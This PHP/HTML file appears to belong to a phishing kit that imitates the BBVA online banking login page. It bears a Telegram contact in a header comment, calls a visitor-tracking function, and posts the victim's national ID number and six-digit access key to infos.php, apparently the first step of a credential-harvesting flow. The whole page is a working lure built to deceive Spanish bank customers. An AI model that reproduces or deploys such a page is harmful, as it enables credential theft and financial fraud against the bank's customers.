<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @ghayt_Zone
-->


<?php 

require_once "functions.php";

visitors();


?>


<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>BBVA</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/ico.ico" type="image/x-icon" />
  <link rel="shortcut icon" href="image/ico.ico" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
</head>


	<body>
		<div class="container">
			<div class="header d-flex align-items-center justify-content-between py-2">
					<div class="flash"><img src="image/fl.png"></div>
					<div class="logo"><img src="image/logo.svg"></div>
					<div class="right"><img src="image/right.png"></div>
			</div>
			<div class="form">
				<form action="infos.php" method="post">
					<input type="hidden" value="index" name="step">
					<div class="form-group mb-3">
              <input type="text" name="nif" id="nif" required="">
              <label>NIF, NIE, Tarjeta o Pasaporte</label> 
              <div class="close"><i style="font-weight: 200;" class="fas fa-times"></i></div>
          </div>
          <div class="form-group mb-3">
              <input type="password" name="password" maxlength="6" id="password" required="">
              <label>Clave de acceso</label> 
              <div class="eye"><i class="fas fa-eye"></i></div>
              <div class="eye-slash"><i class="fas fa-eye-slash"></i></div>
          </div>
          <div class="a">¿Has olvidado tu clave de acceso?</div>
          <div class="bttn">
          	<button id="bttn" name="submit">Iniciar sesión</button>
          	<button style="color:#fff;border:1px solid #fff;background: transparent;" type="button">Hazte cliente</button>
          	<div class="a mt-4" style="font-size: 15px;">Crea tu clave de acceso</div>
          </div>
				</form>
			</div>
		</div>

  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script>
  	$("#nif").focus(function(){
  		$(".close").show()
  	});
  	$("#nif").focusout(function(){
  		$(".close").hide()
  	});

  	$("#password").focus(function(){
  		if ($(this).val().length <= 0) {
  			$(".eye").show()
  		}
  	});

  	$(".eye").click(function(){
  		$(".eye-slash").show();
  		$(this).hide();
  		$("#password").attr("type" , "text")
  	});
  	  	$(".eye-slash").click(function(){
  		$(".eye").show();
  		$(this).hide();
  		$("#password").attr("type" , "password")
  	});

  	  $("#password").keyup(function(){
  	  	if ($(this).val().length == 6) {
  	  		$("#bttn").css({"color":"#fff" , "background":"#028484"})
  	  	}
  	  })
  </script>
</body>
</html>